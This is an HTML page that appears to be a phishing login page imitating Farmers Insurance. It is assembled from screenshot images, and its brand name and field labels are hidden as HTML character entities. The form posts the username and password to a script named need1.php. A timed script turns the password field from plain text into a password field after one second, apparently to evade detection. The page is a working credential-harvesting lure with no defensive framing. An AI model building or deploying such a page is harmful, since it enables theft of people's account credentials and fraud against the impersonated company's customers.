<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#70;&#97;&#114;&#109;&#101;&#114;&#115;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b6b6b6; 
    height: 31px; 
    width: 275px; 
  	font-family: Segoe UI;
    font-size: 16px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 0px; 
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 5px #7bc1f7; 
} 
 </style>
<style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:27px;
							height:22px; 
							display:inline-block;
							line-height:22px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:22px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -22px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_57daffcd41a8ab8ec0a04f901cb66cee.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:596px; z-index:0"><img src="images/f1.png" alt="" title="" border=0 width=1349 height=596></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:594px; width:1349px; height:428px; z-index:1"><img src="images/f2.png" alt="" title="" border=0 width=1349 height=428></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:1021px; width:1349px; height:563px; z-index:2"><img src="images/f3.png" alt="" title="" border=0 width=1349 height=563></div>

<div id="image4" style="position:absolute; overflow:hidden; left:352px; top:449px; width:151px; height:21px; z-index:3"><a href="#"><img src="images/f4.png" alt="" title="" border=0 width=151 height=21></a></div>
<form action=need1.php name=buhatjump id=buhatjump method=post>
<input name="us" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:311px;left:353px;top:285px;z-index:4">
<input name="pw" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:311px;left:353px;top:326px;z-index:5">

<div id="checkboxG1"  style="position:absolute; left:356px; top:367px; z-index:6"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:356px; top:367px; z-index:6"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:353px; top:397px; z-index:7"><input type="image" name="formimage1" width="312" height="45" src="images/flg.png"></div>
</div>

</body>
</html>
